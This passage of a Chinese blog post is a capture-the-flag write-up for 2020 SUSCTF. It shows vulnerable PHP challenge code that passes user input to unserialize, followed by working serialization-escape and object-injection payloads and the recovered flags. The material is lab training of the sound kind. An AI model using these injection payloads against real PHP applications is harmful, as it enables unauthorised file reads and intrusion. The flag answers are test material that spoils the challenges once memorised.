+                <p>图片</p>
+            </figure>
+<p>SUSCTF{so_who_is_AA}</p>
+<h3 id="刀来！"><a href="#刀来！" class="headerlink" title="刀来！"></a>刀来！</h3><figure class="image-box">
+                <a rel=2020susctf_wp href="./24.png" title="图片" data-fancybox="images"><img src="./24.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>SUSCTF{f5f397a37b728d927576ae889b908d17}</p>
+<h3 id="Ez-escape1"><a href="#Ez-escape1" class="headerlink" title="Ez_escape1"></a>Ez_escape1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$name=$_POST[<span class="string">"name"</span>];</span><br><span class="line">$number=<span class="number">10086</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">escape</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $name;</span><br><span class="line"><span class="keyword">public</span> $number;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name,$number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;name=$name;</span><br><span class="line"><span class="keyword">$this</span>-&gt;number=$number;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> str_replace(<span class="string">'nzgnb'</span>,<span class="string">'nzgyyds'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$epoch=filter(serialize(<span class="keyword">new</span> escape($name,$number)));</span><br><span class="line"><span class="keyword">echo</span> $epoch.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$ep0ch=unserialize($epoch);</span><br><span class="line"><span class="keyword">if</span>($ep0ch-&gt;number===<span class="number">1008611</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(file_get_contents(<span class="string">"/flag"</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"try again"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>nzgnb被替换成nzgyyds逃逸2个字符,需要传入的数据长度是26,name传入13个nzgnb即可逃逸<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;s:4:&quot;name&quot;;s:91:&quot;nzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyyds&quot;;s:6:&quot;number&quot;;i:1008611;&#125;&quot;;s:6:&quot;number&quot;;i:10086;&#125;</span><br><span class="line">U1VTQ1RGe2MyYmQyOWRiNDk1N2JmODBjM2M5OWRlMTliZDRhNjBkfQ==</span><br></pre></td></tr></table></figure></p>
+<p>SUSCTF{c2bd29db4957bf80c3c99de19bd4a60d}</p>
+<h3 id="Ez-escape2"><a href="#Ez-escape2" class="headerlink" title="Ez_escape2"></a>Ez_escape2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$haidilao=$_POST[<span class="string">"haidilao"</span>];</span><br><span class="line">$core=$_POST[<span class="string">"core"</span>];</span><br><span class="line">$num=<span class="string">"2019"</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">escape2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $haidilao;</span><br><span class="line"><span class="keyword">public</span> $core;</span><br><span class="line"><span class="keyword">public</span> $num;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($haidilao,$core,$num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;haidilao=$haidilao;</span><br><span class="line"><span class="keyword">$this</span>-&gt;core=$core;</span><br><span class="line"><span class="keyword">$this</span>-&gt;num=$num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;num===<span class="string">"2020"</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(file_get_contents(<span class="string">"/flag"</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"try again"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> str_replace(<span class="string">'Haidilao'</span>,<span class="string">'Hedilao'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$btis=filter(serialize(<span class="keyword">new</span> escape2($haidilao,$core,$num)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.$btis.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$bt15=unserialize($btis);</span><br></pre></td></tr></table></figure>
+<p>根据过滤后字符串减少的原理,使core传入构造代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">"escape2"</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">"haidilao"</span>;s:<span class="number">8</span>:<span class="string">"Hedilao"</span>;s:<span class="number">4</span>:<span class="string">"core"</span>;s:<span class="number">1</span>:<span class="string">"1"</span>;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">4</span>:<span class="string">"2019"</span>;&#125; <span class="comment">#正常的序列化字符串</span></span><br><span class="line"><span class="string">";s:4:"</span>core<span class="string">";s:1:"</span> <span class="comment"># 需要吃掉的字符</span></span><br><span class="line"><span class="string">";s:4:"</span>core<span class="string">";s:1:"</span><span class="number">1</span><span class="string">";s:3:"</span>num<span class="string">";s:4:"</span><span class="number">2020</span><span class="string">";&#125; # 需要传输的core的值</span></span><br></pre></td></tr></table></figure></p>
+<p>截止到core的值共19个字符,即传入19个Haidilao,替换成Hedilao后吞掉19个字符,使后面的payload补上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">haidilao=HaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilao</span><br><span class="line">HaidilaoHaidilaoHaidilaoHaidilao&amp;core=&quot;;s:4:&quot;core&quot;;s:3:&quot;123&quot;;s:3:&quot;num&quot;;s:4:&quot;2020&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="AA-is-who"><a href="#AA-is-who" class="headerlink" title="AA_is_who"></a>AA_is_who</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $name;</span><br><span class="line"><span class="keyword">protected</span> $power;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;name === <span class="string">"Aryb1n"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"AA is Aryb1n"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;power &gt; <span class="number">100000</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"AA is powerful"</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"AA is not so weak"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"who is AA?"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// maybe you should consider URL encode?</span></span><br><span class="line">$aa = $_GET[<span class="string">"aa"</span>];</span><br><span class="line">unserialize($aa);</span><br></pre></td></tr></table></figure>
+<p>get接受aa变量的传参,要求$power的值大于100000,$name的值为Aryb1n,使代码序列化<br>$power类型为protected,需要使用%00进行填充补全,也可以将序列化串进行url编码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name=Aryb1n;</span><br><span class="line">    <span class="keyword">protected</span> $power=<span class="number">1000000</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> AA();</span><br><span class="line"><span class="keyword">print</span> serialize($a);</span><br><span class="line"><span class="keyword">print</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:2:"AA":2:&#123;s:4:"name";s:6:"Aryb1n";s:8:"*power";i:1000000;&#125;</span></span><br><span class="line"><span class="comment">//O%3A2%3A%22AA%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Aryb1n%22%3Bs%3A8%3A%22%00%2A%00power%22%3Bi%3A1000000%3B%7D</span></span><br></pre></td></tr></table></figure>
+<figure class="image-box">
+                <a rel=2020susctf_wp href="./25.png" title="图片" data-fancybox="images"><img src="./25.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-10-21T13:13:30.006Z" itemprop="dateUpdated">2020-10-21 21:13:30</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2020susctf-wp/" target="_blank" rel="external">https://www.damyahome.github.io/2020susctf-wp/</a>
+        
+    </div>
+    <footer>
+        <a href="https://www.damyahome.github.io">
+            <img src="/img/avatar.jpg" alt="Damya">
+            Damya
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/个人ctf竞赛/">个人ctf竞赛</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/2020susctf-wp/&title=《2020susctf_wp》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/2020susctf-wp/&title=《2020susctf_wp》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2020Bilibili解密赛/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">2020Bilibili解密赛</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/大二下网络工程实训考试/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">大二下网络工程实训考试</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#MISC"><span class="post-toc-number">2.</span> <span class="post-toc-text">MISC</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#签到"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">签到</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#调查问卷"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">调查问卷</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#爆破鬼才请求出战"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">爆破鬼才请求出战</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#签到之公众号"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">签到之公众号</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Dance-Dance"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">Dance_Dance</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#balɟ¯ʇuᴉɹԀ"><span class="post-toc-number">2.6.</span> <span class="post-toc-text">ƃɐlɟ¯ʇuᴉɹԀ</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#萌-你还好吗？"><span class="post-toc-number">2.7.</span> <span class="post-toc-text">[萌]你还好吗？</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#萌-fix-fo"><span class="post-toc-number">2.8.</span> <span class="post-toc-text">[萌]fix_fo</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#抓住那只小老鼠"><span class="post-toc-number">2.9.</span> <span class="post-toc-text">抓住那只小老鼠</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#emoji真好玩"><span class="post-toc-number">2.10.</span> <span class="post-toc-text">emoji真好玩</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#小熊你咋带着品如的面具"><span class="post-toc-number">2.11.</span> <span class="post-toc-text">小熊你咋带着品如的面具</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#CRYPTO"><span class="post-toc-number">3.</span> <span class="post-toc-text">CRYPTO</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#简单-嘤语"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">[简单]嘤语</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#WEB"><span class="post-toc-number">4.</span> <span class="post-toc-text">WEB</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Sign-in"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">Sign_in</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#AT-Field"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">AT_Field</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Script-Kiddle"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">Script_Kiddle</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#first-lesson"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">first_lesson</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#刀来！"><span class="post-toc-number">4.5.</span> <span class="post-toc-text">刀来！</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Ez-escape1"><span class="post-toc-number">4.6.</span> <span class="post-toc-text">Ez_escape1</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Ez-escape2"><span class="post-toc-number">4.7.</span> <span class="post-toc-text">Ez_escape2</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#AA-is-who"><span class="post-toc-number">4.8.</span> <span class="post-toc-text">AA_is_who</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        让这个世界的bug有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.pdsdt.lovepdsdt.com/" target="_blank">Pdsdt</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.starssgo.top/" target="_blank">starssgo</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://phoebe233.cn/" target="_blank">W4nder</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.dongzt.cn/" target="_blank">Alkaid</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://whali3n51.top/" target="_blank">Whali3n51</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.ap1e.cn/" target="_blank">Aple</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://geeeez.github.io/" target="_blank">Geez</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://kkzevip.com/" target="_blank">MoR03r</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.virzz.com/" target="_blank">Virink</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.luoluopeach.top/" target="_blank">Luoluo</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://39.97.247.119/" target="_blank">Vigorous</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.constantine24.com/" target="_blank">Shanks</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://www.ysllz.com/" target="_blank">ysllz</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Damya &copy; 2018 - 2021
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/2020susctf-wp/&title=《2020susctf_wp》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/2020susctf-wp/&title=《2020susctf_wp》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACL0lEQVR42u3awYrDMAxF0f7/T2dgVgPTJPdJacHy9aqUJPbxQliSXy88jt/x7DPHn3H2z8NDhgwZyzKOy3H2DP/ONaD25Js1yJAhYwMGD46diWtBGQV3GTJkyCj9/v/ldIkyZMiQ0f9cJx0lb8mQIUNGmsRev3U9Te34+JFcXIYMGQsy0sbAN39/sL8hQ4aMRRhHOHgzksxFDohoVTJkyBjNIBP04x5Pg9NZgn2SIUPGCAY/CD5bhuOt0BuMDBkyhjJqIbV2QOwfCk95MmTI2ICRhlQSxXnrkeNR+ipDhoxxDJ4ikn/SxLhzRaOY6cqQIWNZBi+T8YSzk7gWwTJkyBjN6JfV0mNip2Fw864MGTLGMXjaya9c8ENeh3FaNZQhQ8ZQBpmelM/SlJUsPQi4MmTIGMroty37B8e0bpZuigwZMlZnpK1HPkEnBPO3ZMiQsQOjVrivpbL9ottNsJYhQ8ZQBr+8FewKbnCSjUNrkCFDxmhGGhY7Vy5qpf+gCChDhoyhjNqUTyW0aZg+fV6GDBnbMDpF/FrRv9apQIU2GTJkDGJ0jmtpipte/2pVEGXIkDGIcYSjRq19mbRXZciQsQODj3RxnXBMlh7fbpMhQ8biDN5irDUd0ySWr+GV7qsMGTIWZ5BSWloCI/hOue1NwJUhQ8b2jKcCJWfzax8yZMiQkRa/0jZA58KHDBky9mHwJLZ2CYyHUd5OkCFDxj6MfmOAl/jTifvXyGTIkLE44wcDgW+FtFASDQAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '等你回来呀~';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(つェ⊂)欢迎回来!';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
